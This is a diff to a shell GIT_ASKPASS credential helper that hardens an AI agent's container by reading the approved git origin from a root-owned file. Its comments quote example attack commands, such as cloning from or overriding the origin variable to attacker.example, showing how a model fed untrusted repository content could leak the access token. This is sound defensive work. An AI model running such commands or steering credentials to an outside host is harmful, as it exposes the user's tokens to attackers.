@@ -3,31 +3,53 @@
 # HTTPS credentials. The token therefore never appears in the remote URL, the shell environment of
 # tool subprocesses, or the command line.
 #
-# Credentials are released ONLY for the single origin this workspace was created for, named by
-# AH_GIT_ALLOWED_ORIGIN. The host sets it from the repository URL it has just measured against
-# ALLOWED_REPO_HOSTS, before this container existed. The allow-list itself is deliberately NOT
-# handed to the container: this helper decides from a host it reads out of a prompt string, so a
-# set of acceptable origins would mean a crafted prompt naming any one of them is answered with the
-# token. One origin cannot be steered, and it is narrower than a forge-wide rule — a workspace
-# opened for one repository is not answered for a different repository on the same forge either.
+# Credentials are released ONLY for the single origin this workspace was created for. The host
+# derives that origin from the repository URL it has just measured against ALLOWED_REPO_HOSTS and
+# writes it into ALLOWED_ORIGIN_FILE below, root-owned, before this container runs anything.
 #
-# GIT_ASKPASS is set image-wide, so this also answers git commands the agent itself starts, and the
-# agent is driven by a model that reads untrusted repository content: without the check,
-# `git clone https://attacker.example/x` inside the workspace makes git send the real PAT to that
-# server as Basic auth, which is exactly the exfiltration GIT_ASKPASS exists to prevent.
+# The path is hard-coded and the value is read from that file rather than from the environment,
+# because the environment is not authority here. GIT_ASKPASS is set image-wide, so this script also
+# answers git commands the agent itself starts, and the agent is driven by a model that reads
+# untrusted repository content and may run any shell command. A variable can simply be set again
+# for the command that reads it — `AH_GIT_ALLOWED_ORIGIN=https://attacker.example git clone ...`
+# would have handed the model the policy it is supposed to be constrained by. A root-owned file in
+# a root-owned directory cannot be rewritten, replaced or unlinked by the workspace user: unlink
+# and create are governed by the directory's write bit, which is the same protection this script
+# itself relies on to still be this script.
+#
+# The allow-list is not given to the container either, for a related reason: this helper decides
+# from a host it reads out of a prompt string, so a set of acceptable origins would mean a crafted
+# prompt naming any one of them is answered with the token.
+#
+# What this bounds is WHERE the credential may be sent by git, at origin level — scheme, host and
+# port. It is not a repository-level rule: another repository on the same origin is the same
+# origin, and the prompt does not reliably carry a path to judge anyway. And it is not a claim that
+# the PAT cannot leave the container by other means; the token file is readable by the workspace
+# user by design, so this closes the credential helper as an exfiltration tool, not egress.
 #
 # POSIX sh, no external commands. Every failure path prints nothing on stdout and exits non-zero,
 # so git fails authentication instead of reading an empty string as a valid password.
 set -eu
 
+# Where the host writes the approved origin. Hard-coded, never taken from a variable: a path the
+# workspace could name is a file the workspace could author.
+ALLOWED_ORIGIN_FILE=/opt/agent-runtime/allowed-origin
+
 prompt=${1:-}
 
-# Approved origin. Absent or empty is a container no host prepared, and there is nothing to fall
-# back to: falling back to a forge would give a workspace whose origin was never decided a policy
-# from somewhere else.
-allowed=${AH_GIT_ALLOWED_ORIGIN-}
+# Approved origin. A missing, unreadable or empty file is a container no host prepared, and there
+# is nothing to fall back to: falling back to a forge would give a workspace whose origin was never
+# decided a policy from somewhere else.
+#
+# `read` is a shell builtin, so no PATH lookup happens and a workspace that controls PATH cannot
+# interpose a program here. It reports failure on a file with no trailing newline while still
+# assigning the value, hence the `|| :`.
+allowed=""
+if [ -r "$ALLOWED_ORIGIN_FILE" ]; then
+  IFS= read -r allowed < "$ALLOWED_ORIGIN_FILE" || :
+fi
 if [ -z "$allowed" ]; then
-  echo "askpass: AH_GIT_ALLOWED_ORIGIN is not set; refusing to release credentials" >&2
+  echo "askpass: no approved origin at $ALLOWED_ORIGIN_FILE; refusing to release credentials" >&2
   exit 1
 fi
 
@@ -89,6 +111,10 @@ origin="$scheme://${authority##*@}"
 # Both sides must spell the origin the same way, and both are produced by the same normalisation:
 # the host derives this value with `URL.origin`, and the runtime hands git the repository URL as
 # its own `URL` parse produced it, so what git echoes into the prompt is already canonical.
+#
+# Origin, not repository: `https://github.com/other/repo` is the same origin as the repository this
+# workspace was created for and is answered. Narrowing further would need the path, which the
+# prompt carries only when git is configured to include it.
 if [ "$origin" != "$allowed" ]; then
   echo "askpass: refusing to release credentials to an origin other than $allowed" >&2
   exit 1
